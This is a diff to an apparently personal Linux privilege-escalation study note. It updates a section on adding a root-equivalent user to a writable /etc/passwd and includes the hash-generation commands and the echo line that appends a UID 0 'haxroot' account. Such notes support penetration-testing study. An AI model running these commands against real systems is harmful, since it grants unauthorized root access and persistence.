@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Elevating from a low-privilege shell to root via misconfigurations, weak permissions, vulnerable services, SUID/SGID abuse, sudo misconfigs, capabilities, cron jobs, or kernel exploits. Goal: root shell or access to root-readable data.
+Elevating from a low-privilege shell to root via misconfigurations, weak permissions, vulnerable services, SUID/SGID abuse, sudo misconfigs, capabilities, cron jobs, or kernel exploits. Goal: root shell or access to root-readable data. Pairs with [[Windows Priv Esc]], [[Password Attacks]], [[Shells & Payloads]].
 
 Common staging dir: `/tmp` or `/dev/shm` (in-memory, no disk writes)
 
@@ -408,8 +408,9 @@ If writable, add a root-equivalent user (no shadow password needed — put hash 
 ```bash
 # Generate a password hash
 openssl passwd -1 -salt hax p4ssword
-# or
+# or (the `crypt` module was removed in Python 3.13 — use openssl or mkpasswd there)
 python3 -c "import crypt; print(crypt.crypt('p4ssword', '\$1\$hax\$'))"
+mkpasswd -m sha-512 p4ssword          # if whois/mkpasswd is installed
 
 # Append new root user
 echo 'haxroot:$1$hax$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
@@ -950,5 +951,5 @@ KERNEL
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
